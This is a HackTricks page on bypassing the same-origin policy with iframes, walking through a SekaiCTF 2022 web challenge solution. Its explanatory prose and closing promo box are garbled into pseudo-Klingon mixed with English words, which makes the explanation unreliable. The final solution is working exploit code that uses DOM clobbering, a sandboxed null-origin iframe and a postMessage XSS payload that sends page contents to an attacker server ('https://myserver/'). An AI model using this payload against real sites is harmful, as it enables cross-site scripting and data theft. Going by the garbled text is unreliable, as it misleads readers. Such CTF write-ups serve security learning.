# Bypassing SOP with Iframes - 2

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Iframes in SOP-2

In the [**solution**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) for this [**challenge**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic\_) proposes a similar method to the previous section. Let's check it.

In this challenge the attacker needs to **bypass** this:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
---
**ghItlh** vaj **postmessage** **HTML** content **bI'vItlhutlh** **`innerHTML`** **ghItlh** **sanitation** (**XSS**) **bI'vItlhutlh**.

**'ej** **bypass** **check** **wa'** **`window.calc.contentWindow`** **'e'** **`undefined`** **'ej** **`e.source`** **'e'** **`null`** **bI'vItlhutlh**:

* **`window.calc.contentWindow`** **'oH** **`document.getElementById("calc")`** **'e'**. **`document.getElementById`** **'oH** **`<img name=getElementById />`** **bI'vItlhutlh** (Sanitizer API -[here](https://wicg.github.io/sanitizer-api/#dom-clobbering)- **'oH** **DOM clobbering** **attacks** **bI'vItlhutlh** **Sanitizer API** **default** **state** **ghItlh**).
* **'ach**, **`document.getElementById("calc")`** **'oH** **`<img name=getElementById /><div id=calc></div>`** **bI'vItlhutlh**. **'ej**, **`window.calc`** **'e'** **`undefined`** **bI'vItlhutlh**.
* **vaj**, **`e.source`** **'e'** **`undefined`** **'ej** **`null`** **bI'vItlhutlh** (`==` **`===`** **vItlhutlh**, **`null == undefined`** **'oH** **`True`**). **vaj** **'e'** "easy". **'ej** **iframe** **'ej** **postMessage** **bI'vItlhutlh** **'e'** **'ej** **iframe** **'e'** **'e'** **'ej** **`e.origin`** **'e'** **`null`**. **vItlhutlh** **code** **bI'vItlhutlh**:

---
```
{<iframe id="myIframe" src="https://example.com"></iframe>}
<script>
  const iframe = document.getElementById("myIframe");
  iframe.contentWindow.postMessage("Hello", "*");
  iframe.remove();
</script>
```
```javascript
let iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.target = window.open("http://localhost:8080/");
await new Promise(r => setTimeout(r, 2000)); // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`);
document.body.removeChild(iframe); //e.origin === null
```
**Quch** **`token`** **`null`** **value** **yIqaw** **`window.token`** **`undefined`** **value** **bypass** **`second check`** **ghItlh**:

* **`token`** **value** **`null`** **postMessage** **bIjatlh** **yIqaw**.
* **`window.token`** **`getCookie`** **function** **ghItlh** **`document.cookie`** **vIlegh**. **`null`** **origin pages** **`document.cookie`** **ghItlh** **`error`** **tIq**. **`window.token`** **`undefined`** **value** **yIqaw**.

[**@terjanq**](https://twitter.com/terjanq) **[**ghItlh**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html)** **final solution** **yIqaw**.
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open('https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"');

function start(){
var ifr = document.createElement('iframe');
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = 'allow-scripts allow-popups';
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr);

function hack(){
var win = open('https://obligatory-calc.ctf.sekai.team');
setTimeout(()=>{
parent.postMessage('remove', '*');
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage({token:null, result:"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>"}, '*');
},1000);
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = e=> {if(e.data == 'remove') document.body.innerHTML = ''; }
}
setTimeout(start, 1000);
</script>
</body>
</html>
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlhutlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **qaStaHvIS** **cybersecurity company** vItlhutlh? **HackTricks** **company** **advertised** **want**? **PEASS latest version** **download** **HackTricks PDF** **want**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **check**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, **exclusive NFTs** **collection** **our**
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**
* **Join** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** **or** **follow** **me** **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share** **hacking tricks** **hacktricks repo** **PRs** **submitting** **by** **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
